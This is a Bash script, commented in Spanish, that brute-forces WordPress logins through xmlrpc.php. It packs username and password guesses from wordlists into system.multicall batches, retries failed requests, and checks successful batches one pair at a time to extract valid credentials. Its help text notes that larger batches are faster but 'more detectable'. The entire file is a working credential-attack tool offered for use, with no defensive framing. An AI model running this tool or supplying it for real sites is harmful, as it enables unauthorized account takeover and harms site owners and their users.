#!/bin/bash

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

tmpfile=""
declare -a users=()
declare -a found_creds=()
declare -A cracked=()
declare -a batch_u=()
declare -a batch_p=()
HTTP_CODE=""
RESP_BODY=""

function print_summary() {
    echo ""
    if [ "${#found_creds[@]}" -gt 0 ]; then
        echo -e "${greenColour}[+] Credenciales validas encontradas:${endColour}"
        for c in "${found_creds[@]}"; do
            echo -e "    ${greenColour}$c${endColour}"
        done
    else
        echo -e "${redColour}[-] No se encontraron credenciales validas.${endColour}"
    fi
    echo ""
}

function cleanup() {
    [ -n "$tmpfile" ] && rm -f "$tmpfile" "${tmpfile}.body" 2>/dev/null
    tput cnorm 2>/dev/null
}

function ctrl_c() {
    echo -e "\n\n${redColour}Saliendo...${endColour}"
    print_summary
    exit 1
}

trap ctrl_c SIGINT
trap cleanup EXIT

function helpPanel() {
    echo -e "\n${yellowColour}[+] Uso: $0 (-u <usuario> | -L <lista>) -w <wordlist> -i <ip> [-U <url>] [-b <lote>] [-d <delay>] [-r <reintentos>]${endColour}\n"
    echo -e "\t-u: Un solo usuario a atacar."
    echo -e "\t-L: Archivo con lista de usuarios (uno por linea)."
    echo -e "\t-w: Diccionario de contraseñas."
    echo -e "\t-i: IP o host objetivo."
    echo -e "\t-U: URL completa del xmlrpc (opcional). Por defecto http://<ip>/wordpress/xmlrpc.php"
    echo -e "\t-b: Tamaño de lote multicall (opcional, por defecto 100). Mas alto = mas rapido pero mas detectable."
    echo -e "\t-d: Retardo en segundos entre lotes (opcional, por defecto 0)."
    echo -e "\t-r: Reintentos ante error de red por peticion (opcional, por defecto 2).\n"
    exit 1
}

# Escapa los caracteres XML obligatorios. El orden importa: & primero.
function xml_escape() {
    local s=$1
    s=${s//&/&amp;}
    s=${s//</&lt;}
    s=${s//>/&gt;}
    printf '%s' "$s"
}

# POST con reintentos. Deja HTTP_CODE y RESP_BODY en globales.
# Devuelve 0 si hubo respuesta HTTP, 1 si no.
function http_post() {
    local url=$1 retries=$2 payload=$3
    local attempt=0 code="000"
    while [ $attempt -le "$retries" ]; do
        code=$(curl -s -o "${tmpfile}.body" -w "%{http_code}" \
            --connect-timeout 10 --max-time 30 \
            -X POST "$url" \
            -H "Content-Type: text/xml" \
            --data @"$payload" 2>/dev/null)
        [ -n "$code" ] && [ "$code" != "000" ] && break
        attempt=$((attempt + 1))
        sleep 1
    done
    HTTP_CODE=$code
    RESP_BODY=$(cat "${tmpfile}.body" 2>/dev/null)
    rm -f "${tmpfile}.body" 2>/dev/null
    [ -n "$code" ] && [ "$code" != "000" ]
}

# Intento serial unico. Devuelve: success | fail | disabled | neterror | http:<codigo>
function try_login() {
    local username=$1 password=$2 url=$3 retries=$4
    local eu ep
    eu=$(xml_escape "$username")
    ep=$(xml_escape "$password")

cat > "$tmpfile" <<EOF
<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>${eu}</string></value></param>
<param><value><string>${ep}</string></value></param>
</params>
</methodCall>
EOF

    if ! http_post "$url" "$retries" "$tmpfile"; then
        echo "neterror"; return
    fi
    if echo "$RESP_BODY" | grep -qi "services are disabled\|xml-rpc.*disabled"; then
        echo "disabled"; return
    fi
    if [ "$HTTP_CODE" = "200" ] && echo "$RESP_BODY" | grep -q "methodResponse" && ! echo "$RESP_BODY" | grep -q "faultCode"; then
        echo "success"; return
    fi
    if echo "$RESP_BODY" | grep -qi "Incorrect username or password"; then
        echo "fail"; return
    fi
    echo "http:$HTTP_CODE"
}

# Verifica en serial cada par del lote actual para identificar el/los acierto(s).
function pinpoint_batch() {
    local url=$1 retries=$2 i u p st
    for ((i = 0; i < ${#batch_u[@]}; i++)); do
        u=${batch_u[$i]}; p=${batch_p[$i]}
        [ -n "${cracked[$u]}" ] && continue
        st=$(try_login "$u" "$p" "$url" "$retries")
        case "$st" in
            success)
                echo -e "    [+] ${greenColour}$u : $p${endColour}"
                found_creds+=("$u:$p")
                cracked[$u]=1 ;;
            disabled)
                echo -e "    ${redColour}[-] XML-RPC deshabilitado.${endColour}"
                return 2 ;;
        esac
    done
    return 0
}

# Envia el lote actual via system.multicall y analiza.
# 0 = ok (siga), 2 = abortar todo.
function flush_batch() {
    local url=$1 retries=$2
    local n=${#batch_u[@]} i faults

    [ "$n" -eq 0 ] && return 0

    {
        printf '<?xml version="1.0"?>\n<methodCall>\n<methodName>system.multicall</methodName>\n<params><param><value><array><data>\n'
        for ((i = 0; i < n; i++)); do
            printf '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>\n' \
                "$(xml_escape "${batch_u[$i]}")" "$(xml_escape "${batch_p[$i]}")"
        done
        printf '</data></array></value></param></params>\n</methodCall>\n'
    } > "$tmpfile"

    if ! http_post "$url" "$retries" "$tmpfile"; then
        printf "\n"
        echo -e "    ${redColour}[!] Sin respuesta para un lote de $n. Reintentando esos en serial.${endColour}"
        pinpoint_batch "$url" "$retries"
        return $?
    fi

    # Respuesta que no es XML-RPC: WAF, 403/404, HTML. No tiene caso seguir.
    if [ "$HTTP_CODE" != "200" ] || ! echo "$RESP_BODY" | grep -q "methodResponse"; then
        printf "\n"
        echo -e "    ${redColour}[-] Respuesta no-XMLRPC (HTTP $HTTP_CODE). Posible WAF o xmlrpc bloqueado. Abortando.${endColour}"
        return 2
    fi

    # Fault de nivel superior (<fault> directo) => multicall rechazado o peticion invalida.
    if echo "$RESP_BODY" | grep -q "<fault>"; then
        printf "\n"
        echo -e "    ${redColour}[-] system.multicall rechazado (fault de nivel superior).${endColour}"
        echo -e "    ${yellowColour}    Prueba el script serial, el objetivo puede tener multicall deshabilitado.${endColour}"
        return 2
    fi

    # Cada fallo de auth trae un faultCode dentro de su struct. Exito = sin faultCode.
    faults=$(echo "$RESP_BODY" | grep -o "faultCode" | wc -l | tr -d ' ')
    if [ "$faults" -lt "$n" ]; then
        printf "\n"
        echo -e "    ${greenColour}[+] Lote con posible acierto ($((n - faults)) de $n). Verificando en serial...${endColour}"
        pinpoint_batch "$url" "$retries"
        return $?
    fi

    return 0
}

# Recorre contraseñas, arma lotes de pares (usuario,contraseña) y los dispara.
function run() {
    local url=$1 delay=$2 retries=$3 batchsize=$4
    local p u count=0 total rc

    total=$(grep -c '' "$wordlist" 2>/dev/null)

    while IFS= read -r p || [ -n "$p" ]; do
        p="${p%$'\r'}"
        [ -z "$p" ] && continue
        count=$((count + 1))
        printf "\r${blueColour}[*]${endColour} pass %d/%d | lote %d/%d        " "$count" "$total" "${#batch_u[@]}" "$batchsize"

        for u in "${users[@]}"; do
            [ -n "${cracked[$u]}" ] && continue
            batch_u+=("$u"); batch_p+=("$p")
            if [ "${#batch_u[@]}" -ge "$batchsize" ]; then
                flush_batch "$url" "$retries"; rc=$?
                batch_u=(); batch_p=()
                [ "$rc" -eq 2 ] && return 2
                [ "$delay" != "0" ] && sleep "$delay"
            fi
        done

        [ "${#cracked[@]}" -eq "${#users[@]}" ] && break
    done < "$wordlist"

    # Vaciar el resto
    flush_batch "$url" "$retries"; rc=$?
    batch_u=(); batch_p=()
    [ "$rc" -eq 2 ] && return 2
    return 0
}

tput civis

while getopts "u:L:w:i:U:b:d:r:h" opt; do
    case $opt in
        u) username=$OPTARG ;;
        L) userlist=$OPTARG ;;
        w) wordlist=$OPTARG ;;
        i) ip=$OPTARG ;;
        U) url=$OPTARG ;;
        b) batchsize=$OPTARG ;;
        d) delay=$OPTARG ;;
        r) retries=$OPTARG ;;
        h) helpPanel ;;
        \?) echo "Opcion invalida: $OPTARG" 1>&2; exit 1 ;;
    esac
done

batchsize=${batchsize:-100}
delay=${delay:-0}
retries=${retries:-2}

if ! command -v curl >/dev/null 2>&1; then
    echo -e "\n${redColour}[-] curl no esta instalado.${endColour}\n"; exit 1
fi

if ! [[ "$batchsize" =~ ^[0-9]+$ ]] || [ "$batchsize" -lt 1 ]; then
    echo -e "\n${redColour}[-] El tamaño de lote (-b) debe ser un entero positivo.${endColour}\n"; exit 1
fi

if { [ -z "$username" ] && [ -z "$userlist" ]; } || [ -z "$wordlist" ] || { [ -z "$ip" ] && [ -z "$url" ]; }; then
    helpPanel
fi

[ -z "$url" ] && url="http://$ip/wordpress/xmlrpc.php"

if [ ! -f "$wordlist" ]; then
    echo -e "\n${redColour}[-] No se encontro el diccionario: $wordlist${endColour}\n"; exit 1
fi

# Lista de usuarios
if [ -n "$userlist" ]; then
    if [ ! -f "$userlist" ]; then
        echo -e "\n${redColour}[-] No se encontro la lista de usuarios: $userlist${endColour}\n"; exit 1
    fi
    while IFS= read -r line || [ -n "$line" ]; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        users+=("$line")
    done < "$userlist"
fi
[ -n "$username" ] && users+=("$username")

if [ "${#users[@]}" -eq 0 ]; then
    echo -e "\n${redColour}[-] No hay usuarios validos para atacar.${endColour}\n"; exit 1
fi

tmpfile=$(mktemp) || { echo "No se pudo crear el archivo temporal"; exit 1; }

echo -e "\n${yellowColour}Usuarios:${endColour}    ${blueColour}${#users[@]}${endColour}"
echo -e "${yellowColour}Diccionario:${endColour} ${blueColour}$wordlist${endColour}"
echo -e "${yellowColour}Objetivo:${endColour}    ${blueColour}$url${endColour}"
echo -e "${yellowColour}Modo:${endColour}        ${blueColour}system.multicall (lote $batchsize)${endColour}"

run "$url" "$delay" "$retries" "$batchsize"
rc=$?

print_summary
exit $rc
